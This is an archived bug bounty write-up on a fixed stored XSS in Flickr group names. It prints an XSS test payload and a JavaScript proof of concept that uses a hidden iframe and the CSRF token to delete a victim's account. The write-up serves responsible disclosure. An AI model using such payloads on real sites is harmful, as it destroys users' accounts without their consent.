---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-22_flickr-stored-xss.md
original_filename: 2022-12-22_flickr-stored-xss.md
title: Flickr Stored XSS
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
- clickjacking
- api-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
- clickjacking
- api-security
language: en
raw_sha256: 08abdf0115ef3ebff22bca2927b2c2e26c6f9fc647bb59ff48dff4ee3266d78d
text_sha256: b9234cefda4ac63141f6f9b240390736903cbe02081527adc008b3ee19647e96
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# Flickr Stored XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-22_flickr-stored-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf, clickjacking, api-security
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `08abdf0115ef3ebff22bca2927b2c2e26c6f9fc647bb59ff48dff4ee3266d78d`
- Text SHA256: `b9234cefda4ac63141f6f9b240390736903cbe02081527adc008b3ee19647e96`


## Content

---
title: "Flickr Stored XSS"
url: "https://keerok.github.io/2022/12/22/Flickr-Stored-XSS/"
final_url: "https://keerok.github.io/2022/12/22/Flickr-Stored-XSS/"
authors: ["Guilherme Keerok (@k33r0k)"]
programs: ["Flickr"]
bugs: ["Stored XSS"]
bounty: "3,263"
publication_date: "2022-12-22"
added_date: "2023-06-25"
source: "pentester.land/writeups.json"
original_index: 1742
---

#  Flickr Stored XSS 

Guilherme Keerok

2022-12-22

## Decription

This is a simple bug but I want to write about it anyway. I found this bug  
some [time ago](https://hackerone.com/reports/1534636) and the following article is basically my report (literally my report) that I sended to Flickr bug bounty program.

Using [gau](https://example.com/too_url) I’ve found a lot of paths with `.gne` extension (all the paths that contains `.gne` seems to be a old version of the flikr pages).

When you have a flickr you have a possibility to create a Group and in this groups you can set a name on it, for my primarly tests I put  
this payload on it `</script><img src=x onerror=alert(1)>` in the name of the group. also in a lot of other parts of the application too.

![](https://i.imgur.com/gh3LCqE.png)

After look at every single `.gne` page that I found, the `photos_user_map.gne` was the most interesting one because my first reaction was to click in a button that contain the `</script><img src=x onerror=alert(1)>` (the name of the group) and the XSS was triggered.

![](https://i.imgur.com/bOuHjbJ.png)

After finding the bug I was needing to demonstrate some impact on it, so I create a simple PoC to delete the account of the “victim”, the following code probably is not the most beautiful and maybe have better ways to do it, anyway the important is it worked.

flickr.com have x-frame-options that only allow same origin iframes and since the XSS is in [www.flickr.com](http://www.flickr.com/) we can iframe the `/account/delete`, accessing the content of this iframe, using `ifr.contentDocument.getElementByTagName` I can get all the hrefs of the page, however the one I need is the one that has `h` parameter (`h` parameter is a csrf token).
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  7  
  8  
  9  
  10  
  11  
  12  
  

| 
  
  
  document.write(`<iframe style='display: none' id=ifr src='https://www.flickr.com/account/delete'></iframe>`);  
  ifr.onload = () => {  
  hrefs = ifr.contentDocument.getElementsByTagName('a');  
  for(var i =0; i < hrefs.length; i++){  
  if(hrefs[i].href.match('h=')){  
  hrefs[i].click()  
  }  
  setTimeout(()=>{  
  ifr.contentDocument.getElementsByName('confirm')[0].click();  
  ifr.contentDocument.getElementsByName('Submit')[0].click()},500)  
  }  
  }  
  
  
---|---  
  
After get the real position of the `h` parameter href `hrefs[i].click()` do a simulate click that will redirect to `www.flickr.com/account/delete?step=1&h=TOKEN`. 

![](https://i.imgur.com/ExtMARx.png)

In this second step we need to mark a checkbox `ifra.contentDocument.getElementsByName('confirm')[0].click()` and then click in “delete my account” `ifr.contentDocument.getElementsByName('Submit')[0].click()`.

Note: I put a setTimeout there just because I need the page to load before using the `ifr.contentDocument`.

The final PoC is this one:
  
  
  1  
  2  
  3  
  4  
  5  
  6  
  7  
  8  
  9  
  10  
  11  
  12  
  13  
  14  
  15  
  

| 
  
  
  <html>  
  <head>  
  
  </head>  
  <body>  
  <script>  
  
  location.href="https://www.flickr.com/photos_user_map.gne?path=&nsid=14815413%40N21&mode=group&lang=en&tag=1#document.write(`<iframe  
  style='display: none' id=ifr src='https://www.flickr.com/account/delete'></iframe>`);ifr.onload = () => { hrefs =  
  ifr.contentDocument.getElementsByTagName('a'); for(var i =0; i < hrefs.length; i++){ if(hrefs[i].href.match('h=')){ hrefs[i].click() }  
  setTimeout(()=>{ifr.contentDocument.getElementsByName('confirm')[0].click();  
  ifr.contentDocument.getElementsByName('Submit')[0].click()},500)}}";  
  </script>  
  </body>  
  </html>  
  
  
---|---  
  
Video of the PoC:

## Timeline

  * **April 7th 2022** \- report submited
  * **April 11th 2022** \- first response 
  * **April 18th 2022** \- rewarded $3263
  * **April 25th 2022** \- bug fixed

* * *

  * Link of the hackerone report: <https://hackerone.com/reports/1534636>
